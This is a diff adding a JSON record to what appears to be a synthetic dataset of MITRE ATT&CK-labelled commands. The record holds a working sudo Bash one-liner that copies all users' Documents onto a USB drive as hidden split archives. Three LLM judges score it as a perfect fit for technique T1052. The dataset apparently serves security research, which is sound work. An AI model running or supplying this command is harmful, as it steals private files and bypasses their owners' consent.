@@ -1,0 +1,58 @@
+{
+  "technique_id": "T1052",
+  "platform": "Linux",
+  "shell": "Bash",
+  "command": "sudo bash -c 'UPART=$(ls -1 /dev/disk/by-id/usb-*-part1 2>/dev/null | head -n1); mkdir -p /mnt/usb && mount \"$UPART\" /mnt/usb && tar -cf - /home/*/Documents | gzip -9 | split -b 100M - /mnt/usb/.docs.gz.part- && sync && umount /mnt/usb'",
+  "explanation": "Compresses users' Documents with gzip and splits the archive into 100MB chunks on the mounted USB to fit various media sizes and avoid large single files.",
+  "rationale_steps": [
+    "Mount the USB partition from a by-id device path.",
+    "Create a tar of local document files and compress with gzip.",
+    "Split the stream into smaller parts directly on the USB.",
+    "Flush writes and unmount to complete local-only transfer."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1052-a8d8a262-6726821e",
+  "source_prompt_hash": "a8d8a262",
+  "timestamp_utc": "2025-09-30T05:22:34.253309Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Balanced quoting and command substitution with valid pipes, redirections, and flags make the one-liner well-formed and parseable.",
+        "semantic_score": 5,
+        "semantic_justification": "It identifies a USB partition, mounts it with sudo, archives and compresses users' Documents, splits into 100MB hidden-named chunks on the USB, flushes, and unmounts\u2014fully aligning with exfiltration over a physical medium.",
+        "combined_score": 5.0,
+        "confidence": 1,
+        "timestamp": "2025-10-01T07:09:16.668888Z"
+      },
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with balanced quotes, proper command separators, valid flags, and appropriate error redirection.",
+        "semantic_score": 5,
+        "semantic_justification": "The command perfectly implements T1052 by automatically finding a USB device, mounting it, compressing user documents, splitting them into hidden chunks on the USB drive, and properly unmounting it.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2025-10-01T07:09:19.334125Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with balanced quotes, valid flags, correct command separators, and proper syntax for command substitution and redirection.",
+        "semantic_score": 5,
+        "semantic_justification": "The command precisely aligns with T1052 by identifying a physical medium (USB), staging data (compressing and splitting user documents), and exfiltrating it onto the mounted device before unmounting, directly matching the technique's description.",
+        "combined_score": 5.0,
+        "confidence": 1.0,
+        "timestamp": "2025-10-01T07:09:32.385487Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 5.0,
+    "llm_average_score": 5.0,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
